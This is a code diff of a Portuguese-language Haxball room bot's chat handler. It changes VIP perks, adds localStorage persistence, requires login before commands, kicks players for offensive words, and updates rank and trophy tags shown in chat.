+                        return false;
+                    } else {
+                        console.log("Error");
+                        return false;
+                    }
+                }
+            }
+        } else {
+            room.sendAnnouncement(`${ignoreMessageSets[index][3]} (ID: ${ID})`, player.id, colors2[3], fonts[3], sounds[3]);
+            return false;
+        }
     }
 
-    var rankTag = "❔𓊈𝐕𝐢𝐬𝐢𝐭𝐚𝐧𝐭𝐞𓊉", vipTag = "", puskasTag = "", goldBallTag = "", corChat = "", pausarJogoOFF = false, furarFila = false, msgArray = message.split(/ +/), fonte = ""
+    stats = statsplayer[player.name] ? statsplayer[player.name] : false
+    var rankTag = "❔𓊈𝐕𝐢𝐬𝐢𝐭𝐚𝐧𝐭𝐞𓊉", vipTag = "", puskasTag = "", chuteiraOuroTag = "", luvaOuroTag = "", garcomTag = "", buskasTag = "", goldBallTag = "", corChat = "", pausarJogoOFF = false, furarFila = false, msgArray = message.split(/ +/), fonte = ""
     tipoVip = 0
-
     if (gameState !== State.STOP && player.team != Team.SPECTATORS) {
         let pComp = getPlayerComp(player);
         if (pComp != null) pComp.inactivityTicks = 0;
+    }
+
+    if (message.match(regex)) {
+        var userId = player.id;
+        var motivo1 = `Racismo / Palavras inapropriadas`;
+        var motivo2 = `Você foi banido. Discord para contato: ${discord}`;
+        var tempo = 'permanente';
+        var admin = 'Host';
+
+        room.kickPlayer(player.id, motivo2, true);
+
+        /* for (var indice in jogadoresRoom) {
+            if (jogadoresRoom.hasOwnProperty(indice)) {
+                var jogador = jogadoresRoom[indice];
+
+                if (jogador.id === userId) {
+                    var nomeDoJogador = jogador.nome;
+                    var connDoJogador = jogador.conn;
+                    var authDoJogador = jogador.auth;
+                    var ipv4DoJogador = jogador.ipv4;
+
+                    var bannedUser = {
+                        nome: nomeDoJogador,
+                        id: userId,
+                        conn: connDoJogador,
+                        auth: authDoJogador,
+                        ipv4: ipv4DoJogador,
+                        motivo: motivo1,
+                        init: new Date(),
+                        admin: admin,
+                        adminId: admin,
+                        tempo: tempo,
+                    };
+
+                    banList.push(bannedUser);
+
+                    room.kickPlayer(userId, motivo2, false);
+
+                    room.sendAnnouncement(`O ${nomeDoJogador} foi banido pelo ${admin}.`, null, cores.vermelho, 'italic', 3);
+                    room.sendAnnouncement(`- Motivo: Racismo / Palavras inapropriadas`, null, cores.vermelho, 'italic');
+                    room.sendAnnouncement(`- Tempo do banimento: ${tempo}`, null, cores.vermelho, 'italic');
+
+                    break;
+                }
+            }
+        } */
+
+        return false;
     }
 
     if (chooseMode && teamRed.length * teamBlue.length != 0) {
@@ -10536,6 +7354,9 @@ room.onPlayerChat = function (player, message) {
             } else if (vips[authArray[player.id]].fonte == 6) {
                 fonte = "small-italic"
             }
+            vipsdb.splice(0, vipsdb.length);
+            vipsdb.push(vips)
+            localStorage.setItem("vips", JSON.stringify(vipsdb));
         }
     }
 
@@ -10543,19 +7364,136 @@ room.onPlayerChat = function (player, message) {
         var filter = slowModeFunction(player, message);
         if (filter) {
             if (tipoVip >= 2) {
-                room.sendAnnouncement(`Tu está digitando rápido demais. Aguarde... 1.5s.`,
+                room.sendAnnouncement(`Você está digitando rápido demais. Aguarde... 1.5s.`,
                     player.id, infoColor, 'bold', HaxNotification.CHAT)
                 return false
             }
-            room.sendAnnouncement(`Tu está digitando rápido demais. Aguarde... ${defaultSlowMode}s.`,
+            room.sendAnnouncement(`Você está digitando rápido demais. Aguarde... ${defaultSlowMode}s.`,
                 player.id, infoColor, 'bold', HaxNotification.CHAT)
             return false
         }
     }
 
-    if (player.admin && msgArray[0] == '!sorteio') {
-        room.sendAnnouncement(`O admin ${player.name} iniciou o sorteio!\nO Ganhandor foi... ${room.getPlayerList()[Math.floor(Math.random() * room.getPlayerList().length)].name}\nParabéns seu prêmio será entregue pelo adm, aguarde....`,
-            null, infoColor, 'bold', HaxNotification.CHAT)
+    // if(modoPosicao && comandosPosicoes.includes(message.toUpperCase().slice(1))){
+    //     message = message.toUpperCase().slice(1)
+    //     if(player.team == 1){
+    //         for(let v in posicoesPreenchidasRed){
+    //         if(posicoesPreenchidasRed[v] == player.id){
+    //         posicoesPreenchidasRed[v] = false
+    //         }
+
+    //         if(!posicoesPreenchidasRed[message]){
+    //         room.setPlayerAvatar(player.id, message);
+    //         escolheramPosicao.push(player.id)
+    //         posicoesPreenchidasRed[message] = player.id
+    //         switch(message.toUpperCase()){
+    //             case 'GK':
+    //                     room.setPlayerDiscProperties(player.id, {x: -1200, y: 0})
+    //             break
+    //             case 'LD':
+    //                 room.setPlayerDiscProperties(player.id, {x: -685, y: 300})
+    //             break
+    //             case 'LE':
+    //                 room.setPlayerDiscProperties(player.id, {x: -663, y: -300})
+    //             break
+    //             case 'VL':
+    //                 room.setPlayerDiscProperties(player.id, {x: -870, y: 0})
+    //             break
+    //             case 'MC':
+    //                 room.setPlayerDiscProperties(player.id, {x: -200, y: 0})
+    //             break
+    //             case 'PD':
+    //                     room.setPlayerDiscProperties(player.id, {x: -180, y: 318})
+    //             break
+    //             case 'PE':
+    //                 room.setPlayerDiscProperties(player.id, {x: -260, y: -274})
+    //             break
+    //         }
+    //         room.sendAnnouncement(`Você escolheu a posição ${message}!`,
+    //             player.id, infoColor, 'bold', HaxNotification.CHAT)
+    //         return false
+    //     }else{
+    //         room.sendAnnouncement(`A posição ${message} ja foi escolhida!`,
+    //             player.id, errorColor, 'bold', HaxNotification.CHAT)
+    //         return false
+    //     }
+    //     }
+    //     }else{
+    //         for(let v in posicoesPreenchidasBlue){
+    //         if(posicoesPreenchidasBlue[v] == player.id){
+    //         posicoesPreenchidasBlue[v] = false
+    //         }
+
+    //         if(!posicoesPreenchidasBlue[message]){
+    //         room.setPlayerAvatar(player.id, message);
+    //         escolheramPosicao.push(player.id)
+    //         posicoesPreenchidasBlue[message] = player.id
+    //         switch(message.toUpperCase()){
+    //             case 'GK':
+    //                  room.setPlayerDiscProperties(player.id, {x: 1200, y: 0})
+    //             break
+    //             case 'LD':
+    //                 room.setPlayerDiscProperties(player.id, {x: 685, y: -300})
+    //             break
+    //             case 'LE':
+    //                 room.setPlayerDiscProperties(player.id, {x: 663, y: 300})
+    //             break
+    //             case 'VL':
+    //                 room.setPlayerDiscProperties(player.id, {x: 870, y: 0})
+    //             break
+    //             case 'MC':
+    //                     room.setPlayerDiscProperties(player.id, {x: 200, y: 0})
+    //             break
+    //             case 'PD':
+    //                 room.setPlayerDiscProperties(player.id, {x: 180, y: 318})
+    //             break
+    //             case 'PE':
+    //                 room.setPlayerDiscProperties(player.id, {x: 260, y: 274})
+    //             break
+    //         }
+    //         room.sendAnnouncement(`Você escolheu a posição ${message}!`,
+    //             player.id, infoColor, 'bold', HaxNotification.CHAT)
+    //         return false
+    //     }else{
+    //         room.sendAnnouncement(`A posição ${message} ja foi escolhida!`,
+    //             player.id, errorColor, 'bold', HaxNotification.CHAT)
+    //         return false
+    //     }
+    //     }
+    //     }
+    // }
+
+
+    if (tipoVip >= 2 && msgArray[0] == '!meunis') {
+        if (vips[authArray[player.id]].unis) {
+            room.sendAnnouncement(`Seus unis:`,
+                player.id, defaultColor, 'bold', HaxNotification.CHAT)
+            for (let i in vips[authArray[player.id]].unis) {
+                room.sendAnnouncement(`${vips[authArray[player.id]].unis[i]}\n`,
+                    player.id, defaultColor, 'bold', HaxNotification.CHAT)
+            }
+        }
+        return false
+    }
+    if (tipoVip >= 2 && msgArray[0] == '!meprovos') {
+        if (vips[authArray[player.id]].provos) {
+            room.sendAnnouncement(`Suas provos:
+                    !pro1`,
+                player.id, defaultColor, 'bold', HaxNotification.CHAT)
+            for (let i in vips[authArray[player.id]].provos) {
+                room.sendAnnouncement(`${vips[authArray[player.id]].provos[i]}\n`,
+                    player.id, defaultColor, 'bold', HaxNotification.CHAT)
+            }
+        }
+        return false
+    }
+    if (player.admin && msgArray[0] == '!sorteio2') {
+        room.sendAnnouncement(`O Admin ${player.name} iniciou o sorteio! Parabéns seu prêmio será entregue pelo adm, aguarde....`, null, infoColor, 'bold', HaxNotification.CHAT)
+        room.sendAnnouncement(`O Ganhandor foi... ${room.getPlayerList()[Math.floor(Math.random() * room.getPlayerList().length)].name}`, null, infoColor, 'bold', HaxNotification.CHAT)
+
+        setTimeout(() => {
+            room.sendAnnouncement(`- Parabéns seu prêmio será entregue pelo admistrador, aguarde....`, null, infoColor, 'bold', HaxNotification.CHAT)
+        }, 1000);
         return false
     }
     if (player.team == 1) {
@@ -10571,34 +7509,21 @@ room.onPlayerChat = function (player, message) {
         }
     }
 
-    var stats2 = new HaxStatistics(player.name);
-    if (localStorage.getItem(authArray[player.id])) {
-        stats2 = JSON.parse(localStorage.getItem(authArray[player.id]));
-    }
-
     if (tipoVip != 0) {
         if (tipoVip == 1) {
-            vipTag = ` [${vipNames[1]}] `
+            vipTag = tags[player.name] ? `𓊈${tags[player.name]}𓊉` : `  𓊈${vipNames[1]}𓊉 `
         } else if (tipoVip == 2) {
-            vipTag = ` [🧤${stats2.CS}] [${vipNames[2]}] `
+            vipTag = tags[player.name] ? `𓊈${tags[player.name]}𓊉 ` : `  𓊈${vipNames[2]}𓊉 `
         } else if (tipoVip == 3) {
-            vipTag = ` [🔥${stats2.assists}] [⚽${stats2.goals}] [${vipNames[3]}] `
+            vipTag = tags[player.name] ? `𓊈${tags[player.name]}𓊉` : `  𓊈${vipNames[3]}𓊉 `
         } else if (tipoVip == 4) {
-            vipTag = ` [🧤${stats2.CS}] [🔥${stats2.assists}] [⚽${stats2.goals}] [${vipNames[4]}] `
+            vipTag = tags[player.name] ? `𓊈${tags[player.name]}𓊉` : `  𓊈${vipNames[4]}𓊉 `
         }
-    }
-
-    if (puskas[authArray[player.id]]) {
-        puskasTag = ` ${puskasTagSetting} `
-    }
-
-    if (goldBall[authArray[player.id]]) {
-        goldBallTag = ` ${goldBallTagSetting} `
     }
 
     if (modoVoteBan && message == '!s') {
         if (votouBan.includes(player.id)) {
-            room.sendAnnouncement(`Tu já votou!`,
+            room.sendAnnouncement(`Você já votou!`,
                 player.id, errorColor, 'bold', HaxNotification.CHAT)
             return false
         }
@@ -10610,7 +7535,7 @@ room.onPlayerChat = function (player, message) {
     }
     if (modoVoteMute && message == '!s') {
         if (votouMute.includes(player.id)) {
-            room.sendAnnouncement(`Tu já votou!`,
+            room.sendAnnouncement(`Você já votou!`,
                 player.id, errorColor, 'bold', HaxNotification.CHAT)
             return false
         }
@@ -10623,36 +7548,64 @@ room.onPlayerChat = function (player, message) {
 
     if (msgArray[0].substring(0, 7).toLowerCase() == '!avatar' && tipoVip > 1) {
         if (!msgArray[1]) {
-            room.sendAnnouncement(`Tu precisa informar qual avatar vai ser alterado! Exemplo:\n!avatar <1> <avatar> (para quando faz gol) ou !avatar <2> <avatar> (para quando toma gol)`,
+            room.sendAnnouncement(`Você precisa informar qual avatar vai ser alterado! Exemplo:\n!avatar <1> <avatar> (para quando faz gol) ou !avatar <2> <avatar> (para quando toma gol)`,
                 player.id, errorColor, 'bold', HaxNotification.CHAT)
             return false
         }
         if (msgArray[1] >= 1 && msgArray[1] <= 2) {
             if (!msgArray[2]) {
-                room.sendAnnouncement(`Tu precisa informar o texto ou emoji do avatar! Exemplo:\n!avatar 1 🙂`,
+                room.sendAnnouncement(`Você precisa informar o texto ou emoji do avatar! Exemplo:\n!avatar 1 🙂`,
                     player.id, errorColor, 'bold', HaxNotification.CHAT)
                 return false
             }
             vips[authArray[player.id]].avatarGol[msgArray[1] - 1] = msgArray[2]
+            vipsdb.splice(0, vipsdb.length);
+            vipsdb.push(vips)
+            localStorage.setItem("vips", JSON.stringify(vipsdb));
             room.sendAnnouncement(`Avatar ${msgArray[1]} modificado com sucesso!`,
                 player.id, defaultColor, 'bold', HaxNotification.CHAT)
             return false
         } else {
-            room.sendAnnouncement(`Tu só pode modificar o avatar 1 (para quando faz gol) ou 2 (para quando toma gol)!`,
+            room.sendAnnouncement(`Você só pode modificar o avatar 1 (para quando faz gol) ou 2 (para quando toma gol)!`,
                 player.id, errorColor, 'bold', HaxNotification.CHAT)
             return false
         }
+
     }
 
     if (capitão == player.id) {
         if (uniList[msgArray[0].toLowerCase()] != undefined) {
+            if (vipTimeoutId) {
+                stopChangeVip(vipTimeoutId);
+            }
             room.setTeamColors(player.team, ...uniList[msgArray[0].toLowerCase()])
             return false
         }
     }
 
+
+    function changeVipValue(vip) {
+        currentVipValue = (currentVipValue % 3) + 1; // Alternar entre 1, 2 e 3
+        room.setTeamColors(player.team, ...uniVIP2[vip][currentVipValue]);
+
+        vipTimeoutId = setTimeout(function () { changeVipValue(vip); }, 10);
+    }
+
+    if (capitão == player.id && tipoVip > 0 && vips[authArray[player.id]]) {
+        if (uniVIP[msgArray[0].toLowerCase()] != undefined) {
+            if (vipTimeoutId) {
+                stopChangeVip(vipTimeoutId);
+            }
+            room.setTeamColors(player.team, ...uniVIP[msgArray[0].toLowerCase()]);
+            return false;
+        } else if (uniVIP2[msgArray[0].toLowerCase()] != undefined) {
+            changeVipValue(msgArray[0].toLowerCase());
+            return false;
+        }
+    }
+
     if (msgArray[0].substring(0, 7).toLowerCase() == '!setuni' && tipoVip > 1) {
-        if (msgArray[1] >= 1 && msgArray[1] <= 3) {
+        if (msgArray[1] >= 1 && msgArray[1] <= (tipoVip == 2 ? 1 : (tipoVip == 3 ? 2 : 5))) {
             if (msgArray[4]) {
                 let regEx1 = new RegExp(`^[0-9]{1,3}$`)
                 let regEx2 = new RegExp(`^[0-9a-fA-F]{6}$`)
@@ -10667,10 +7620,19 @@ room.onPlayerChat = function (player, message) {
                 if (regEx1.test(msgArray[2]) && regEx2.test(msgArray[3]) && regEx2.test(msgArray[4]) && xuxa1 && xuxa2) {
                     if (msgArray[6]) {
                         vips[authArray[player.id]].unis['!uni' + msgArray[1]] = [msgArray[2], '0x' + msgArray[3], ['0x' + msgArray[4], '0x' + msgArray[5], '0x' + msgArray[6]]]
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
                     } else if (msgArray[5]) {
                         vips[authArray[player.id]].unis['!uni' + msgArray[1]] = [msgArray[2], '0x' + msgArray[3], ['0x' + msgArray[4], '0x' + msgArray[5]]]
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
                     } else {
                         vips[authArray[player.id]].unis['!uni' + msgArray[1]] = [msgArray[2], '0x' + msgArray[3], ['0x' + msgArray[4]]]
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
                     }
                     room.sendAnnouncement(`Uniforme criado/modificado com sucesso! Use o comando !uni${msgArray[1]} para usar!`,
                         player.id, defaultColor, 'bold', HaxNotification.CHAT)
@@ -10686,7 +7648,7 @@ room.onPlayerChat = function (player, message) {
                 return false
             }
         } else {
-            room.sendAnnouncement(`Tu só pode usar uniforme vip de 1 a 3!`,
+            room.sendAnnouncement(`Você só pode criar até ${(tipoVip == 2 ? 1 : (tipoVip == 3 ? 2 : 5))} uniformes vips ( Utilize como exemplo !setuni 1 60 FFFFFF 0080FF 004077 002033`,
                 player.id, errorColor, 'bold', HaxNotification.CHAT)
             return false
         }
@@ -10703,7 +7665,7 @@ room.onPlayerChat = function (player, message) {
 
     if (!player.admin && muteArray.getByAuth(authArray[player.id]) != null) {
         room.sendAnnouncement(
-            `Tu está mutado! Aguarde o tempo de mutação.`,
+            `Você está mutado! Aguarde o tempo de mutação.`,
             player.id,
             errorColor,
             'bold',
@@ -10722,15 +7684,19 @@ room.onPlayerChat = function (player, message) {
                 if (player.team != 0) {
                     if (gameState == State.PLAY) {
                         if (!pausarJogoOFF) {
+                            vipPausou.push(player.name)
                             vips[authArray[player.id]].pausarJogoOFF = true
                             room.pauseGame(true)
                             setTimeout(() => {
-                                room.pauseGame(false);
-                            }, 15000);
+                                if (State.PAUSE) {
+                                    room.pauseGame(false);
+                                }
+                                vipPausou.splice(vipPausou.indexOf(player.name), 1)
+                            }, tipoVip == 1 ? 10000 : (tipoVip == 2 ? 15000 : 30000));
                             let salvarAuth = authArray[player.id]
                             setTimeout(() => {
                                 vips[salvarAuth].pausarJogoOFF = false
-                            }, tipoVip == 1 ? 10 * 60 * 1000 : 5 * 60 * 1000)
+                            }, tipoVip == 1 ? 30 * 60 * 1000 : 5 * 60 * 1000)
                             if (tipoVip == 4) {
                                 room.sendAnnouncement(
                                     `Jogo pausado 30 segundos pelo VIP: ${player.name}`,
@@ -10750,15 +7716,26 @@ room.onPlayerChat = function (player, message) {
                         } else {
                             if (tipoVip == 1) {
                                 room.sendAnnouncement(
-                                    `Tu só pode usar o comando pause a cada 10 minutos. Aguarde...`,
+                                    `Você só pode usar o comando pause a cada 30 minutos. Aguarde...`,
                                     player.id,
                                     errorColor,
                                     'bold',
                                     HaxNotification.CHAT);
                                 return false
-                            } else {
+                            }
+                            else if (tipoVip == 2) {
                                 room.sendAnnouncement(
-                                    `Tu só pode usar o comando pause a cada 5 minutos. Aguarde...`,
+                                    `Você só pode usar o comando pause a cada 15 minutos. Aguarde...`,
+                                    player.id,
+                                    errorColor,
+                                    'bold',
+                                    HaxNotification.CHAT);
+                                return false
+                            }
+
+                            else {
+                                room.sendAnnouncement(
+                                    `Você só pode usar o comando pause a cada 5 minutos. Aguarde...`,
                                     player.id,
                                     errorColor,
                                     'bold',
@@ -10768,7 +7745,7 @@ room.onPlayerChat = function (player, message) {
                         }
                     } else if (gameState == State.STOP) {
                         room.sendAnnouncement(
-                            `Tu só pode pausar enquanto o jogo está em andamento.`,
+                            `Você só pode pausar enquanto o jogo está em andamento.`,
                             player.id,
                             errorColor,
                             'bold',
@@ -10785,7 +7762,7 @@ room.onPlayerChat = function (player, message) {
                     }
                 } else {
                     room.sendAnnouncement(
-                        `Tu precisa estar jogando para pausar o jogo`,
+                        `Você precisa estar jogando para pausar o jogo`,
                         player.id,
                         errorColor,
                         'bold',
@@ -10797,9 +7774,10 @@ room.onPlayerChat = function (player, message) {
                     if (gameState == State.PAUSE) {
                         if (tipoVip == 1 || tipoVip == 2 || tipoVip == 3 || tipoVip == 4) {
                             if (pausarJogoOFF) {
-                                vips[authArray[player.id]].pausarJogoOFF = false
-                                room.pauseGame(false);
+                                vipPausou.splice(vipPausou.indexOf(player.name), 1);
+                                vips[authArray[player.id]].pausarJogoOFF = false;
 
+                                room.pauseGame(false);
                                 room.sendAnnouncement(`Jogo despausado pelo VIP: ${player.name}`, null, defaultColor, 'bold', 3);
 
                                 return false;
@@ -10824,9 +7802,21 @@ room.onPlayerChat = function (player, message) {
                     return false
                 }
             case '!corchat':
+                if (tipoVip < 2) {
+                    room.sendAnnouncement(
+                        `Somentes VIP Estelar oo superior conseguem usar esse comando.`,
+                        player.id,
+                        errorColor,
+                        'bold',
+                        HaxNotification.CHAT);
+                    return false
+                }
                 let regEx0 = new RegExp(`^[0-9a-fA-F]{6}$`)
                 if (regEx0.test(msgArray[1])) {
                     vips[authArray[player.id]].corChat = msgArray[1]
+                    vipsdb.splice(0, vipsdb.length);
+                    vipsdb.push(vips)
+                    localStorage.setItem("vips", JSON.stringify(vipsdb));
                     room.sendAnnouncement(`A cor do seu chat foi alterada para: ${msgArray[1]}`,
                         player.id, 0xffffff, 'bold', HaxNotification.CHAT);
                 } else {
@@ -10851,25 +7841,25 @@ room.onPlayerChat = function (player, message) {
                                 }, x * 60 * 1000)
                                 return false
                             } else {
-                                let msgErro = tipoVip == 2 ? '30' : tipoVip == 3 ? '15' : '10'
-                                room.sendAnnouncement(`Tu só pode pular a fila a cada ${msgErro} minutos!`,
+                                let msgErro = tipoVip == 2 ? '40' : tipoVip == 3 ? '30' : '15'
+                                room.sendAnnouncement(`Você só pode pular a fila a cada ${msgErro} minutos!`,
                                     player.id, errorColor, 'bold', HaxNotification.CHAT);
                                 return false
                             }
                         } else {
-                            room.sendAnnouncement(`Tu só pode pular a fila com o jogo em andamento!`,
+                            room.sendAnnouncement(`Você só pode pular a fila com o jogo em andamento!`,
                                 player.id, errorColor, 'bold', HaxNotification.CHAT);
                             return false
                         }
                     } else {
                         room.sendAnnouncement(
-                            `Tu precisa estar na fila de Spectador para usar este comando!`,
+                            `Você precisa estar na fila de Spectador para usar este comando!`,
                             player.id, errorColor, 'bold', HaxNotification.CHAT);
                         return false
                     }
                 } else {
                     room.sendAnnouncement(
-                        `Apenas VIP GOD pode furar a fila!`,
+                        `Apenas VIP Terráqueo ou superior pode furar a fila!`,
                         player.id, errorColor, 'bold', HaxNotification.CHAT);
                     return false
                 }
@@ -10879,10 +7869,13 @@ room.onPlayerChat = function (player, message) {
     if (msgArray[0].substring(0, 9).toLowerCase() == '!entrada' && tipoVip > 1) {
         if (msgArray[1]) {
             vips[authArray[player.id]].msgEntrada = message.substring(9)
+            vipsdb.splice(0, vipsdb.length);
+            vipsdb.push(vips)
+            localStorage.setItem("vips", JSON.stringify(vipsdb));
             room.sendAnnouncement(`Mensagem de entrada criada/alterada com sucesso!`, player.id, defaultColor, 'bold', HaxNotification.CHAT)
             return false
         } else {
-            room.sendAnnouncement('Mensagem vazia! Informe neste formato de exemplo: !entrada texto', player.id, errorColor, 'bold', HaxNotification.CHAT)
+            room.sendAnnouncement('Menssagem vazia! Informe neste formato de exemplo: !entrada texto', player.id, errorColor, 'bold', HaxNotification.CHAT)
             return false
         }
     }
@@ -10890,6 +7883,9 @@ room.onPlayerChat = function (player, message) {
     if (msgArray[0].substring(0, 9).toLowerCase() == '!fonte' && tipoVip >= 1) {
         if (msgArray[1] && msgArray[1] >= 1 && msgArray[1] <= 6) {
             vips[authArray[player.id]].fonte = msgArray[1]
+            vipsdb.splice(0, vipsdb.length);
+            vipsdb.push(vips)
+            localStorage.setItem("vips", JSON.stringify(vipsdb));
             room.sendAnnouncement(`Fonte alterada com sucesso!`, player.id, defaultColor, 'bold', HaxNotification.CHAT)
             return false
         } else {
@@ -10898,29 +7894,37 @@ room.onPlayerChat = function (player, message) {
         }
     }
 
-    if (msgArray[0].substring(0, 7).toLowerCase() == '!setpro' && tipoVip > 1) {
-        if (tipoVip == 2) {
+    if (msgArray[0].substring(0, 7).toLowerCase() == '!setpro' && tipoVip >= 1) {
+        if (tipoVip == 1) {
             if (msgArray[1] != 1) {
-                room.sendAnnouncement(`Número da provocação inválido! Tu só pode criar 1 provocação, exemplo: !setpro 1 texto`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                room.sendAnnouncement(`Número da provocação inválido! Você só pode criar 1 provocação, exemplo: !setpro 1 texto`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                return false
+            }
+        } else if (tipoVip == 2) {
+            if (msgArray[1] < 1 || msgArray[1] > 2) {
+                room.sendAnnouncement(`Número da provocação inválido! Você só pode criar 2 provocações, exemplo: !setpro 2 texto`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                 return false
             }
         } else if (tipoVip == 3) {
-            if (msgArray[1] < 1 || msgArray[1] > 2) {
-                room.sendAnnouncement(`Número da provocação inválido! Tu só pode criar 2 provocações, exemplo: !setpro 2 texto`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+            if (msgArray[1] < 1 || msgArray[1] > 3) {
+                room.sendAnnouncement(`Número da provocação inválido! Você só pode criar 3 provocações, exemplo: !setpro 3 texto`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                 return false
             }
         } else if (tipoVip == 4) {
             if (msgArray[1] < 1 || msgArray[1] > 5) {
-                room.sendAnnouncement(`Número da provocação inválido! Tu só pode criar 5 provocações, exemplo: !setpro 5 texto`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                room.sendAnnouncement(`Número da provocação inválido! Você só pode criar 5 provocações, exemplo: !setpro 5 texto`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                 return false
             }
         }
         if (msgArray[2]) {
             vips[authArray[player.id]].provos['!pro' + msgArray[1]] = player.name + ': ' + message.substring(9)
+            vipsdb.splice(0, vipsdb.length);
+            vipsdb.push(vips)
+            localStorage.setItem("vips", JSON.stringify(vipsdb));
             room.sendAnnouncement(`Provocação ${msgArray[1]} criada com sucesso! Comando para usar: !pro${msgArray[1]}`, player.id, defaultColor, 'bold', HaxNotification.CHAT)
             return false
         } else {
-            room.sendAnnouncement('Mensagem vazia!', player.id, errorColor, 'bold', HaxNotification.CHAT)
+            room.sendAnnouncement('Menssagem vazia!', player.id, errorColor, 'bold', HaxNotification.CHAT)
             return false
         }
         return false
@@ -10931,7 +7935,7 @@ room.onPlayerChat = function (player, message) {
             room.sendAnnouncement(`${player.name}: ` + provos[msgArray[0].toLowerCase()], null, player.team == 1 ? '0xFF8080' : player.team == 2 ? '0x8080FF' : defaultColor, 'bold', HaxNotification.CHAT)
             return false
         } else {
-            room.sendAnnouncement(`Tu só pode provocar quando estiver em um time!`,
+            room.sendAnnouncement(`Você só pode provocar quando estiver em um time!`,
                 player.id, errorColor, 'bold', HaxNotification.CHAT)
             return false;
         }
@@ -10944,13 +7948,19 @@ room.onPlayerChat = function (player, message) {
                 return false
             }
         } else {
-            room.sendAnnouncement(`Tu só pode provocar quando estiver em um time!`,
+            room.sendAnnouncement(`Você só pode provocar quando estiver em um time!`,
                 player.id, errorColor, 'bold', HaxNotification.CHAT)
             return false;
         }
     }
 
     if (msgArray[0][0] == '!') {
+        if (!confirm.includes(player.id) && account[player.name] && msgArray[0] != '!login') {
+            room.sendAnnouncement(
+                `Primeiro faça login para usar os comandos.`,
+                player.id, errorColor, 'bold', HaxNotification.CHAT)
+            return false;
+        }
         let command = getCommand(msgArray[0].slice(1).toLowerCase());
         if (command != false && commands[command].roles <= getRole(player)) commands[command].function(player, message);
         else
@@ -10960,8 +7970,8 @@ room.onPlayerChat = function (player, message) {
         return false;
     }
 
-    if (localStorage.getItem(authArray[player.id])) {
-        var stats = JSON.parse(localStorage.getItem(authArray[player.id]));
+    if (statsplayer[authArray[player.id]]) {
+        var stats = statsplayer[authArray[player.id]];
         rankTag = stats.pontos >= 45 && stats.pontos < 100 ? "🥉𓊈𝐁𝐫𝐨𝐧𝐳𝐞𓊉" :
             stats.pontos >= 100 && stats.pontos < 200 ? "🥉🥉𓊈𝐁𝐫𝐨𝐧𝐳𝐞𓊉" :
                 stats.pontos >= 200 && stats.pontos < 300 ? "🥉🥉🥉𓊈𝗕𝗿𝗼𝗻𝘇𝗲𓊉" :
@@ -10995,21 +8005,53 @@ room.onPlayerChat = function (player, message) {
                                                                                                                                 stats.pontos >= 3000 && stats.pontos < 3100 ? "🤴𓊈Rei𓊉" :
                                                                                                                                     stats.pontos >= 3100 && stats.pontos ? "🐐𓊈Goat𓊉" : ""
     }
+    //🥴💎🌀👽🥉🥈🥇💲👑🏆⭐🌌🔥🌟🥷🏼🗿🍷🫅🏻🔥♾️🪙🪵minhoca?
 
     if (message.length > 100 && player.admin == false && tipoVip < 3) {
         room.sendAnnouncement(`Você excedeu o limite de 100 caracteres! (Desbloqueie com ${vipNames[3]})`, player.id, errorColor, 'bold', 2);
         return false;
     }
 
-    if (masterList.includes(authArray[player.id])) {
-        room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${rankTag + vipTag + puskasTag + goldBallTag} ${player.admin ? `${config.flash.cargos.fundador}` : ''} ${player.name}: ${message}`, null, corChat != "" ? '0x' + corChat : 0xE0E0E0, fonte != "" ? fonte : null, 1);
-    } else if (adminList.includes(authArray[player.id])) {
-        room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${rankTag + vipTag + puskasTag + goldBallTag} ${player.admin ? `${config.flash.cargos.adminOficial}` : ''} ${player.name}: ${message}`, null, corChat != "" ? '0x' + corChat : 0xE0E0E0, fonte != "" ? fonte : null, 1);
-    } else if (mods.includes(authArray[player.id])) {
-        room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${rankTag + vipTag + puskasTag + goldBallTag} ${player.admin ? `${config.flash.cargos.moderador}` : ''} ${player.name}: ${message}`, null, corChat != "" ? '0x' + corChat : 0xE0E0E0, fonte != "" ? fonte : null, 1);
-    } else {
-        room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${rankTag + vipTag + puskasTag + goldBallTag} ${player.admin ? `${config.flash.cargos.administrador}` : ''} ${player.name}: ${message}`, null, corChat != "" ? '0x' + corChat : 0xE0E0E0, fonte != "" ? fonte : null, 1);
+    if (puskas[authArray[player.id]]) {
+        puskasTag = ` ${puskasTagSetting} `
     }
+
+    if (garcom[authArray[player.id]]) {
+        garcomTag = ` ${garcomTagSetting} `
+    }
+
+    if (luva[authArray[player.id]]) {
+        luvaOuroTag = ` ${luvaOuroTagSetting} `
+    }
+
+    if (chuteira[authArray[player.id]]) {
+        chuteiraOuroTag = ` ${chuteiraOuroTagSetting} `
+    }
+
+    if (buskas[authArray[player.id]]) {
+        buskasTag = ` ${buskasTagSetting} `
+    }
+
+    if (goldBall[authArray[player.id]]) {
+        goldBallTag = ` ${goldBallTagSetting} `
+    }
+
+
+    recipients.forEach(p => {
+        if (masterList.includes(authArray[player.id])) {
+            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${rankTag + vipTag + puskasTag + buskasTag + goldBallTag + garcomTag + luvaOuroTag + chuteiraOuroTag} ${player.admin ? `${config.cargos.fundador}` : ''} ${player.name}: ${message}`, p.id, cordochat[player.name] ? '0x' + cordochat[player.name] : (corChat != "" ? '0x' + corChat : 0xE0E0E0), fonte != "" ? fonte : null, 1);
+        } else if (donoList.includes(authArray[player.id])) {
